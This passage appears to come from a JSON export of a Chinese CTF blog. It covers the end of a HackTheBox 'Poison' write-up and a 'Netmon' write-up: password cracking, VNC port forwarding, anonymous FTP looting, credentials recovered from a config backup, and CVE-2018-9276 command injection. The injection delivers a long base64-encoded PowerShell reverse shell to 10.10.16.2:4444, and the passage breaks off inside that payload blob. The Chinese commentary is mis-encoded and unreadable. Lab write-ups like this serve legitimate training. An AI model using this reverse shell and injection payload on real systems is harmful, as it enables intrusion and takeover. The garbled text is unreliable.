--wordlist=/usr/share/wordlists/rockyou.txt hash Using default input encoding: UTF-8 Loaded 1 password hash (PKZIP [32/64]) Will run 4 OpenMP threads Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status 0g 0:00:00:00 DONE (2023-02-08 19:04) 0g/s 16299Kp/s 16299Kc/s 16299KC/s &quot;2parrow&quot;..*7Â¡Vamos! Session completed. çˆ†ç ´æ²¡æœ‰æˆåŠŸï¼Œå°è¯•ä¸€ä¸‹ charix çš„ç™»å½•å¯†ç å‘¢ï¼Ÿ â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# unzip secret.zip Archive: secret.zip [secret.zip] secret password: extracting: secret å¥½å§ï¼Œæ˜¯æˆ‘ç»™æƒ³å¤æ‚äº† â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# file secret secret: Non-ISO extended-ASCII text, with no line terminators â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# chmod +x secret â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# ./secret ./secret: 1: ï¿½ï¿½[: not found ./secret: 1: Õ–z!: not found ä¸æ˜¯å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå…ˆæ”¾ç€å§ï¼Œå»çœ‹çœ‹æœ¬åœ°ç«¯å£ charix@Poison:~ % netstat -an Active Internet connections (including servers) Proto Recv-Q Send-Q Local Address Foreign Address (state) tcp4 0 0 10.10.10.84.22 10.10.16.2.46492 ESTABLISHED tcp4 0 0 127.0.0.1.25 *.* LISTEN tcp4 0 0 *.80 *.* LISTEN tcp6 0 0 *.80 *.* LISTEN tcp4 0 0 *.22 *.* LISTEN tcp6 0 0 *.22 *.* LISTEN tcp4 0 0 127.0.0.1.5801 *.* LISTEN tcp4 0 0 127.0.0.1.5901 *.* LISTEN udp4 0 0 *.514 *.* udp6 0 0 *.514 *.* Active UNIX domain sockets Address Type Recv-Q Send-Q Inode Conn Refs Nextref Addr fffff80003b39d20 stream 0 0 0 fffff80003b39e10 0 0 fffff80003b39e10 stream 0 0 0 fffff80003b39d20 0 0 fffff80003b3a2d0 stream 0 0 0 fffff80003b3a3c0 0 0 /tmp/.X11-unix/X1 fffff80003b3a3c0 stream 0 0 0 fffff80003b3a2d0 0 0 fffff80003b3a5a0 stream 0 0 0 fffff80003b3a4b0 0 0 /tmp/.X11-unix/X1 fffff80003b3a4b0 stream 0 0 0 fffff80003b3a5a0 0 0 fffff80003b3a690 stream 0 0 fffff80003b32588 0 0 0 /tmp/.X11-unix/X1 fffff80003b3ab40 stream 0 0 fffff80003ae6938 0 0 0 /var/run/devd.pipe fffff80003b3a0f0 dgram 0 0 0 fffff80003b3a960 0 0 fffff80003b3a1e0 dgram 0 0 0 fffff80003b3a870 0 fffff80003b3a780 fffff80003b3a780 dgram 0 0 0 fffff80003b3a870 0 0 fffff80003b3a870 dgram 0 0 fffff80003c56000 0 fffff80003b3a1e0 0 /var/run/logpriv fffff80003b3a960 dgram 0 0 fffff80003c561d8 0 fffff80003b3a0f0 0 /var/run/log fffff80003b3aa50 seqpac 0 0 fffff80003ae6760 0 0 0 /var/run/devd.seqpacket.pipe å‘ç°å¼€ç€ VNC ç«¯å£ ps -aux root 529 0.0 0.9 23620 8872 v0- I 11:33 0:00.03 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/ æŸ¥çœ‹è¿›ç¨‹ï¼Œå‘ç° VNC æ˜¯ç”± root ç”¨æˆ·è¿è¡Œçš„ è¿™è¾¹æ˜¯å†…ç½‘çš„ç«¯å£ï¼Œæˆ‘ä»¬æ— æ³•è®¿é—®ï¼Œç»™ä»–è½¬å‘å‡ºæ¥å°±å¯ä»¥äº† ssh -L 5901:127.0.0.1:5901 charix@10.10.10.84 ç„¶åä½¿ç”¨ vncviewer è¿›è¡Œè¿æ¥ â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# vncviewer 127.0.0.1::5901 -passwd secret root@Poison:~ # whoami&amp;&amp;id root uid=0(root) gid=0(wheel) groups=0(wheel),5(operator) æˆåŠŸææƒåˆ° root æƒé™ root@Poison:~ # cat root.txt 716d04b188419cf2bb99d891272361f5 æˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Netmon - Hackthebox","slug":"Hackthebox - Netmon","date":"2023-01-08T11:38:36.000Z","updated":"2023-05-20T02:07:27.000Z","comments":true,"path":"2023/01/08/Hackthebox - Netmon/","link":"","permalink":"http://www.lucifiel.com/2023/01/08/Hackthebox%20-%20Netmon/","excerpt":"","text":"Hackthebox - Netmoné¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æ”¶é›†Nmapâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# nmap -sS -sV -A -sC -p- --min-rate 5000 10.10.10.152 Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-08 04:24 CST Nmap scan report for 10.10.10.152 Host is up (0.49s latency). Not shown: 65522 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) | 02-02-19 11:18PM 1024 .rnd | 02-25-19 09:15PM &lt;DIR&gt; inetpub | 07-16-16 08:18AM &lt;DIR&gt; PerfLogs | 02-25-19 09:56PM &lt;DIR&gt; Program Files | 02-02-19 11:28PM &lt;DIR&gt; Program Files (x86) | 02-03-19 07:08AM &lt;DIR&gt; Users |_02-25-19 10:49PM &lt;DIR&gt; Windows | ftp-syst: |_ SYST: Windows_NT 80/tcp open http Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor) | http-title: Welcome | PRTG Network Monitor (NETMON) |_Requested resource was /index.htm |_http-server-header: PRTG/18.1.37.13946 |_http-trane-info: Problem with XML parsing of /evox/about 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.93%E=4%D=1/8%OT=21%CT=1%CU=35681%PV=Y%DS=2%DC=T%G=Y%TM=63B9D584 OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS=A OS:)OPS(O1=M537NW8ST11%O2=M537NW8ST11%O3=M537NW8NNT11%O4=M537NW8ST11%O5=M53 OS:7NW8ST11%O6=M537ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000 OS:)ECN(R=Y%DF=Y%T=80%W=2000%O=M537NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+ OS:%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T OS:=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0 OS:%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S OS:=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R OS:=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N OS:%T=80%CD=Z) Network Distance: 2 hops Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -1s, deviation: 0s, median: -2s | smb2-time: | date: 2023-01-07T20:26:34 |_ start_date: 2023-01-07T20:23:08 | smb-security-mode: | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 311: |_ Message signing enabled but not required TRACEROUTE (using port 3306/tcp) HOP RTT ADDRESS 1 648.51 ms 10.10.16.1 2 397.22 ms 10.10.10.152 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 117.23 seconds æ¼æ´åˆ©ç”¨Ftpâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# ftp 10.10.10.152 Connected to 10.10.10.152. 220 Microsoft FTP Service Name (10.10.10.152:root): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ftp&gt; ls 229 Entering Extended Passive Mode (|||49861|) 125 Data connection already open; Transfer starting. 02-02-19 11:18PM 1024 .rnd 02-25-19 09:15PM &lt;DIR&gt; inetpub 07-16-16 08:18AM &lt;DIR&gt; PerfLogs 02-25-19 09:56PM &lt;DIR&gt; Program Files 02-02-19 11:28PM &lt;DIR&gt; Program Files (x86) 02-03-19 07:08AM &lt;DIR&gt; Users 02-25-19 10:49PM &lt;DIR&gt; Windows 226 Transfer complete. ftp å¯ä»¥ä½¿ç”¨åŒ¿åè´¦æˆ·ç™»å½•ï¼Œå¹¶ä¸”è¿˜æœ‰ä¸€äº›ç›®å½•æ–‡ä»¶ ftp&gt; pwd Remote directory: /users/Public ftp&gt; ls 229 Entering Extended Passive Mode (|||49886|) 125 Data connection already open; Transfer starting. 02-03-19 07:05AM &lt;DIR&gt; Documents 07-16-16 08:18AM &lt;DIR&gt; Downloads 07-16-16 08:18AM &lt;DIR&gt; Music 07-16-16 08:18AM &lt;DIR&gt; Pictures 01-07-23 03:23PM 34 user.txt 07-16-16 08:18AM &lt;DIR&gt; Videos 226 Transfer complete. ftp&gt; get user.txt local: user.txt remote: user.txt 229 Entering Extended Passive Mode (|||49887|) 125 Data connection already open; Transfer starting. 100% |**********************************************************************************************************************************************************************| 34 0.05 KiB/s 00:00 ETA 226 Transfer complete. 34 bytes received in 00:00 (0.03 KiB/s) åœ¨ç›®å½• /users/public ä¸­æ‰¾åˆ°äº† user.txt æ–‡ä»¶ï¼Œå¹¶ä¸”å¯ä»¥ get è¯·æ±‚åˆ°æœ¬åœ° â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# cat user.txt d79ce5330dd16fc989a3fbf6e31f5259 æˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶ ftp&gt; get license.rtf local: license.rtf remote: license.rtf 229 Entering Extended Passive Mode (|||50056|) 125 Data connection already open; Transfer starting. 100% |**********************************************************************************************************************************************************************| 50098 48.91 KiB/s 00:00 ETAftp: Reading from network: è¢«ä¸­æ–­çš„ç³»ç»Ÿè°ƒç”¨ 0% | | -1 0.00 KiB/s --:-- ETA 226 Transfer complete. ftp&gt; pwd Remote directory: /windows/system32 åœ¨ç›®å½• /windows/system32 ä¸‹æˆåŠŸä¸‹è½½åˆ°äº† license.rtf æ–‡ä»¶ï¼Œå¹¶ä¸”æˆåŠŸä»è¯¥æ–‡ä»¶ä¸­è·å–åˆ°äº†ç³»ç»Ÿç‰ˆæœ¬ MICROSOFT WINDOWS SERVER 2016 STANDARD AND DATACENTER æ‰¾åˆ°äº†ä¸€ç¯‡æ–‡ç«  https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data è¯¥æ–‡ç« æ˜¾ç¤º windows server 2016 çš„ RPTG é»˜è®¤å®‰è£…ç›®å½•åœ¨ programdata ä¸­ï¼Œå»æŸ¥çœ‹ä¸€ä¸‹ ftp&gt; cd programdata 250 CWD command successful. ftp&gt; cd paessler 250 CWD command successful. ftp&gt; ls 229 Entering Extended Passive Mode (|||50169|) 125 Data connection already open; Transfer starting. 01-07-23 03:24PM &lt;DIR&gt; PRTG Network Monitor 226 Transfer complete. ç¡®å®å­˜åœ¨ ftp&gt; cd &quot;PRTG Network Monitor&quot; 250 CWD command successful. ftp&gt; ls 229 Entering Extended Passive Mode (|||50179|) 150 Opening ASCII mode data connection. 01-07-23 03:24PM &lt;DIR&gt; Configuration Auto-Backups 01-07-23 03:24PM &lt;DIR&gt; Log Database 02-02-19 11:18PM &lt;DIR&gt; Logs (Debug) 02-02-19 11:18PM &lt;DIR&gt; Logs (Sensors) 02-02-19 11:18PM &lt;DIR&gt; Logs (System) 01-07-23 03:24PM &lt;DIR&gt; Logs (Web Server) 01-07-23 03:24PM &lt;DIR&gt; Monitoring Database 02-25-19 09:54PM 1189697 PRTG Configuration.dat 02-25-19 09:54PM 1189697 PRTG Configuration.old 07-14-18 02:13AM 1153755 PRTG Configuration.old.bak 01-07-23 03:24PM 1632703 PRTG Graph Data Cache.dat 02-25-19 10:00PM &lt;DIR&gt; Report PDFs 02-02-19 11:18PM &lt;DIR&gt; System Information Database 02-02-19 11:40PM &lt;DIR&gt; Ticket Database 02-02-19 11:18PM &lt;DIR&gt; ToDo Database ftp&gt; get &quot;PRTG Configuration.old.bak&quot; local: PRTG Configuration.old.bak remote: PRTG Configuration.old.bak 229 Entering Extended Passive Mode (|||50302|) 125 Data connection already open; Transfer starting. 7% |*********** | 88641 86.52 KiB/s 00:12 ETAftp: Reading from network: è¢«ä¸­æ–­çš„ç³»ç»Ÿè°ƒç”¨ 0% | | -1 0.00 KiB/s --:-- ETA 550 The specified network name is no longer available. è·å–æ–‡ä»¶ Configuration.old.bak grep -B5 -A5 -i password RPTG\\ Configuration.dat.bak|sed &#39;s/ //g&#39;|sort -u|less åœ¨è¯¥æ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬æ‰¾åˆ°äº†ä¸€ä¸²ç–‘ä¼¼å¯†ç çš„ç©æ„å„¿ &lt;proxyport&gt; PrTg@dmin2018 &lt;retrysnmp&gt; &lt;!--User:prtgadmin--&gt; ä½†æ˜¯æ‹¿å» web é¡µé¢ä¸­ç™»å½•å´åˆå¤±è´¥äº† 02-25-19 09:54PM 1189697 PRTG Configuration.dat 02-25-19 09:54PM 1189697 PRTG Configuration.old 07-14-18 02:13AM 1153755 PRTG Configuration.old.bak 01-07-23 03:24PM 1632703 PRTG Graph Data Cache.dat çªç„¶æƒ³åˆ°ï¼Œè¿™ä¸ªæ–‡ä»¶æ˜¯åœ¨ 2018 å¹´åˆ›å»ºçš„ï¼Œé‚£ä¹ˆä¼šä¸ä¼šæ ¹æ®å¹´ä»½å˜åŒ–å‘¢ï¼Ÿ username = prtgadmin password = PrTg@dmin2019 å»å°è¯•ä¸€ä¸‹ niceï¼ŒæˆåŠŸç™»å½• æƒé™æå‡ åœ¨æ‰¾å‚è€ƒæ–‡ç« å’Œæ¼æ´çš„æ—¶å€™ï¼Œå€’æ˜¯é‡åˆ°ä¸ªå°æ’æ›²ã€‚è¿™é‡Œå› ä¸ºæˆ‘çš„èŠ‚ç‚¹æ˜¯ä¿„ç½—æ–¯çš„ï¼Œæœ‰ä¸€äº›æ–‡ç« ç›´æ¥æ— æ³•è®¿é—®ï¼Œç»äº† https://github.com/A1vinSmith/CVE-2018-9276 åˆç†æ‰¾åˆ°äº†ä¸€ä¸ªå‘½ä»¤æ³¨å…¥çš„æ¼æ´ä»¥åŠåˆ©ç”¨å·¥å…· è¿™ä¸ªåŸç†æ˜¯ Netmon åœ¨æ‰§è¡Œé€šçŸ¥è„šæœ¬æ—¶ï¼Œå› ä¸ºæ²¡æœ‰æ‰§è¡Œå‚æ•°æ£€æŸ¥è€Œå¯¼è‡´çš„å‘½ä»¤æ³¨å…¥æ¼æ´ ç‚¹å‡» `Setup -&gt; Notifications -&gt; Ticket Notification -&gt; Execute Program è¿™é‡Œå°±æ˜¯æˆ‘ä»¬åˆ©ç”¨çš„åœ°æ–¹ ä½†æ˜¯åœ¨åˆ©ç”¨ä¹‹å‰æˆ‘ä»¬è¦å…ˆåšç‚¹å‡†å¤‡ https://github.com/samratashok/nishang é¦–å…ˆä½¿ç”¨ nishang çš„ç¨‹åº â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop] â””â”€# cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 . å°†æˆ‘ä»¬éœ€è¦çš„è„šæœ¬å¤åˆ¶åˆ°æœ¬åœ° nc -nvlp 4444 ä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.2 -Port 4444 å°†ä¸Šé¢çš„è¯­å¥æ·»åŠ åˆ° Invoke-PowerShellTcp.ps1 çš„æœ€ä¸‹é¢ æ¥ç€å°†å†…å®¹è½¬åŒ–ä¸º base64 cat Invoke-PowerShellTcp.ps1|iconv -t UTF-16LE|base64 -w0 ç„¶åæ„é€ ä¸€ä¸‹æ¶æ„ poc test|powershell -enc ZgB1AG4AYwB0AGkAbwBuACAASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwACAACgB7ACAACgA8ACMACgAuAFMAWQBOAE8AUABTAEkAUwAKAE4AaQBzAGgAYQBuAGcAIABzAGMAcgBpAHAAdAAgAHcAaABpAGMAaAAgAGMAYQBuACAAYgBlACAAdQBzAGUAZAAgAGYAbwByACAAUgBlAHYAZQByAHMAZQAgAG8AcgAgAEIAaQBuAGQAIABpAG4AdABlAHIAYQBjAHQAaQB2AGUAIABQAG8AdwBlAHIAUwBoAGUAbABsACAAZgByAG8AbQAgAGEAIAB0AGEAcgBnAGUAdAAuACAACgAKAC4ARABFAFMAQwBSAEkAUABUAEkATwBOAAoAVABoAGkAcwAgAHMAYwByAGkAcAB0ACAAaQBzACAAYQBiAGwAZQAgAHQAbwAgAGMAbwBuAG4AZQBjAHQAIAB0AG8AIABhACAAcwB0AGEAbgBkAGEAcgBkACAAbgBlAHQAYwBhAHQAIABsAGkAcwB0AGUAbgBpAG4AZwAgAG8AbgAgAGEAIABwAG8AcgB0ACAAdwBoAGUAbgAgAHUAcwBpAG4AZwAgAHQAaABlACAALQBSAGUAdgBlAHIAcwBlACAAcwB3AGkAdABjAGgALgAgAAoAQQBsAHMAbwAsACAAYQAgAHMAdABhAG4AZABhAHIAZAAgAG4AZQB0AGMAYQB0ACAAYwBhAG4AIABjAG8AbgBuAGUAYwB0ACAAdABvACAAdABoAGkAcwAgAHMAYwByAGkAcAB0ACAAQgBpAG4AZAAgAHQAbwAgAGEAIABzAHAAZQBjAGkAZgBpAGMAIABwAG8AcgB0AC4ACgAKAFQAaABlACAAcwBjAHIAaQBwAHQAIABpAHMAIABkAGUAcgBpAHYAZQBkACAAZgByAG8AbQAgAFAAbwB3AGUAcgBmAHUAbgAgAHcAcgBpAHQAdABlAG4AIABiAHkAIABCAGUAbgAgAFQAdQByAG4AZQByACAAJgAgAEQAYQB2AGUAIABIAGEAcgBkAHkACgAKAC4AUABBAFIAQQBNAEUAVABFAFIAIABJAFAAQQBkAGQAcgBlAHMAcwAKAFQAaABlACAASQBQACAAYQBkAGQAcgBlAHMAcwAgAHQAbwAgAGMAbwBuAG4AZQBjAHQAIAB0AG8AIAB3AGgAZQBuACAAdQBzAGkAbgBnACAAdABoAGUAIAAtAFIAZQB2AGUAcgBzAGUAIABzAHcAaQB0AGMAaAAuAAoACgAuAFAAQQBSAEEATQBFAFQARQBSACAAUABvAHIAdAAKAFQAaABlACAAcABvAHIAdAAgAHQAbwAgAGMAbwBuAG4AZQBjAHQAIAB0AG8AIAB3AGgAZQBuACAAdQBzAGkAbgBnACAAdABoAGUAIAAtAFIAZQB2AGUAcgBzAGUAIABzAHcAaQB0AGMAaAAuACAAVwBoAGUAbgAgAHUAcwBpAG4AZwAgAC0AQgBpAG4AZAAgAGkAdAAgAGkAcwAgAHQAaABlACAAcABvAHIAdAAgAG8AbgAgAHcAaABpAGMAaAAgAHQAaABpAHMAIABzAGMAcgBpAHAAdAAgAGwAaQBzAHQAZQBuAHMALgAKAAoALgBFAFgAQQBNAFAATABFAAoAUABTACAAPgAgAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAgAC0AUgBlAHYAZQByAHMAZQAgAC0ASQBQAEEAZABkAHIAZQBzAHMAIAAxADkAMgAuADEANgA4AC4AMgA1ADQALgAyADIANgAgAC0AUABvAHIAdAAgADQANAA0ADQACgAKAEEAYgBvAHYAZQAgAHMAaABvAHcAcwAgAGEAbgAgAGUAeABhAG0AcABsAGUAIABvAGYAIABhAG4AIABpAG4AdABlAHIAYQBjAHQAaQB2AGUAIABQAG8AdwBlAHIAUwBoAGUAbABsACAAcgBlAHYAZQByAHMAZQAgAGMAbwBuAG4AZQBjAHQAIABzAGgAZQBsAGwALgAgAEEAIABuAGUAdABjAGEAdAAvAHAAbwB3AGUAcgBjAGEAdAAgAGwAaQBzAHQAZQBuAGUAcgAgAG0AdQBzAHQAIABiAGUAIABsAGkAcwB0AGUAbgBpAG4AZwAgAG8AbgAgAAoAdABoAGUAIABnAGkAdgBlAG4AIABJAFAAIABhAG4AZAAgAHAAbwByAHQALgAgAAoACgAuAEUAWABBAE0AUABMAEUACgBQAFMAIAA+ACAASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwACAALQBCAGkAbgBkACAALQBQAG8AcgB0ACAANAA0ADQANAAKAAoAQQBiAG8AdgBlACAAcwBoAG8AdwBzACAAYQBuACAAZQB4AGEAbQBwAGwAZQAgAG8AZgAgAGEAbgAgAGkAbgB0AGUAcgBhAGMAdABpAHYAZQAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIABiAGkAbgBkACAAYwBvAG4AbgBlAGMAdAAgAHMAaABlAGwAbAAuACAAVQBzAGUAIABhACAAbgBlAHQAYwBhAHQALwBwAG8AdwBlAHIAYwBhAHQAIAB0AG8AIABjAG8AbgBuAGUAYwB0ACAAdABvACAAdABoAGkAcwAgAHAAbwByAHQALgAgAAoACgAuAEUAWABBAE0AUABMAEUACgBQAFMAIAA+ACAASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwACAALQBSAGUAdgBlAHIAcwBlACAALQBJAFAAQQBkAGQAcgBlAHMAcwAgAGYAZQA4ADAAOgA6ADIAMABjADoAMgA5AGYAZgA6AGYAZQA5AGQAOgBiADkAOAAzACAALQBQAG8AcgB0ACAANAA0ADQANAAKAAoAQQBiAG8AdgBlACAAcwBoAG8AdwBzACAAYQBuACAAZQB4AGEAbQBwAGwAZQAgAG8AZgAgAGEAbgAgAGkAbgB0AGUAcgBhAGMAdABpAHYAZQAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIAByAGUAdgBlAHIAcwBlACAAYwBvAG4AbgBlAGMAdAAgAHMAaABlAGwAbAAgAG8AdgBlAHIAIABJAFAAdgA2AC4AIABBACAAbgBlAHQAYwBhAHQALwBwAG8AdwBlAHIAYwBhAHQAIABsAGkAcwB0AGUAbgBlAHIAIABtAHUAcwB0ACAAYgBlAAoAbABpAHMAdABlAG4AaQBuAGcAIABvAG4AIAB0AGgAZQAgAGcAaQB2AGUAbgAgAEkAUAAgAGEAbgBkACAAcABvAHIAdAAuACAACgAKAC4ATABJAE4ASwAKAGgAdAB0AHAAOgAvAC8AdwB3AHcALgBsAGEAYgBvAGYAYQBwAGUAbgBlAHQAcgBhAHQAaQBvAG4AdABlAHMAdABlAHIALgBjAG8AbQAvADIAMAAxADUALwAwADUALwB3AGUAZQBrAC0AbwBmAC0AcABvAHcAZQByAHMAaABlAGwAbAAtAHMAaABlAGwAbABzAC0AZABhAHkALQAxAC4AaAB0AG0AbAAKAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AbgBlAHQAdABpAHQAdQBkAGUALwBwAG8AdwBlAHIAcwBoAGUAbABsAC8AYgBsAG8AYgAvAG0AYQBzAHQAZQByAC8AcABvAHcAZQByAGYAdQBuAC4AcABzADEACgBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAHMAYQBtAHIAYQB0AGEAcwBoAG8AawAvAG4AaQBzAGgAYQBuAGcACgAjAD4AIAAgACAAIAAgACAACgAgACAAIAAgAFsAQwBtAGQAbABlAHQAQgBpAG4AZABpAG4AZwAoAEQAZQBmAGEAdQBsAHQAUABhAHIAYQBtAGUAdABlAHIAUwBlAHQATgBhAG0AZQA9ACIAcgBlAHYAZQByAHMAZQAiACkAXQAgAFAAYQByAGEAbQAoAAoACgAgACAAIAAgACAAIAAgACAAWwBQAGEAcgBhAG0AZQB0AGUAcgAoAFAAbwBzAGkAdABpAG8AbgAgAD0AIAAwACwAIABNAGEAbgBkAGEAdABvAHIAeQAgAD0AIAAkAHQAcgB1AGUALAAgAFAAYQByAGEAbQBlAHQAZQByAFMAZQB0AE4AYQBtAGUAPQAiAHIAZQB2AGUAcgBzAGUAIgApAF0ACgAgACAAIAAgACAAIAAgACAAWwBQAGEAcgBhAG0AZQB0AGUAcgAoAFAAbwBzAGkAdABpAG8AbgAgAD0AIAAwACwAIABNAGEAbgBkAGEAdABvAHIAeQAgAD0AIAAkAGYAYQBsAHMAZQAsACAAUABhAHIAYQBtAGUAdABlAHIAUwBlAHQATgBhAG0AZQA9ACIAYgBpAG4AZAAiACkAXQAKACAAIAAgACAAIAAgACAAIABbAFMAdAByAGkAbgBnAF0ACgAgACAAIAAgACAAIAAgACAAJABJAFAAQQBkAGQAcgBlAHMAcwAsAAoACgAgACAAIAAgACAAIAAgACAAWwBQAGEAcgBhAG0AZQB0AGUAcgAoAFAAbwBzAGkAdABpAG8AbgAgAD0AIAAxACwAIABNAGEAbgBkAGEAdABvAHIAeQAgAD0AIAAkAHQAcgB1AGUALAAgAFAAYQByAGEAbQBlAHQAZQByAFMAZQB0AE4AYQBtAGUAPQAiAHIAZQB2AGUAcgBzAGUAIgApAF0ACgAgACAAIAAgACAAIAAgACAAWwBQAGEAcgBhAG0AZQB0AGUAcgAoAFAAbwBzAGkAdABpAG8AbgAgAD0AIAAxACwAIABNAGEAbgBkAGEAdABvAHIAeQAgAD0AIAAkAHQAcgB1AGUALAAgAFAAYQByAGEAbQBlAHQAZQByAFMAZQB0AE4AYQBtAGUAPQAiAGIAaQBuAGQAIgApAF0ACgAgACAAIAAgACAAIAAgACAAWwBJAG4AdABdAAoAIAAgACAAIAAgACAAIAAgACQAUABvAHIAdAAsAAoACgAgACAAIAAgACAAIAAgACAAWwBQAGEAcgBhAG0AZQB0AGUAcgAoAFAAYQByAGEAbQBlAHQAZQByAFMAZQB0AE4AYQBtAGUAPQAiAHIAZQB2AGUAcgBzAGUAIgApAF0ACgAgACAAIAAgACAAIAAgACAAWwBTAHcAaQB0AGMAaABdAAoAIAAgACAAIAAgACAAIAAgACQAUgBlAHYAZQByAHMAZQAsAAoACgAgACAAIAAgACAAIAAgACAAWwBQAGEAcgBhAG0AZQB0AGUAcgAoAFAAYQByAGEAbQBlAHQAZQByAFMAZQB0AE4AYQBtAGUAPQAiAGIAaQBuAGQAIgApAF0ACgAgACAAIAAgACAAIAAgACAAWwBTAHcAaQB0AGMAaABdAAoAIAAgACAAIAAgACAAIAAgACQAQgBpAG4AZAAKAAoAIAAgACAAIAApAAoACgAgACAAIAAgAAoAIAAgACAAIAB0AHIAeQAgAAoAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAIAAgACMAQwBvAG4AbgBlAGMAdAAgAGIAYQBjAGsAIABpAGYAIAB0AGgAZQAgAHIAZQB2AGUAcgBzAGUAIABzAHcAaQB0AGMAaAAgAGkAcwAgAHUAcwBlAGQALgAKACAAIAAgACAAIAAgACAAIABpAGYAIAAoACQAUgBlAHYAZQByAHMAZQApAAoAIAAgACAAIAAgACAAIAAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAGMAbABpAGUAbgB0ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJABJAFAAQQBkAGQAcgBlAHMAcwAsACQAUABvAHIAdAApAAoAIAAgACAAIAAgACAAIAAgAH0ACgAKACAAIAAgACAAIAAgACAAIAAjAEIAaQBuAGQAIAB0AG8AIAB0AGgAZQAgAHAAcgBvAHYAaQBkAGUAZAAgAHAAbwByAHQAIABpAGYAIABCAGkAbgBkACAAcwB3AGkAdABjAGgAIABpAHMAIAB1AHMAZQBkAC4ACgAgACAAIAAgACAAIAAgACAAaQBmACAAKAAkAEIAaQBuAGQAKQAKACAAIAAgACAAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABsAGkAcwB0AGUAbgBlAHIAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAYwBwAEwAaQBzAHQAZQBuAGUAcgBdACQAUABvAHIAdAAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAbABpAHMAdABlAG4AZQByAC4AcwB0AGEAcgB0ACgAKQAgACAAIA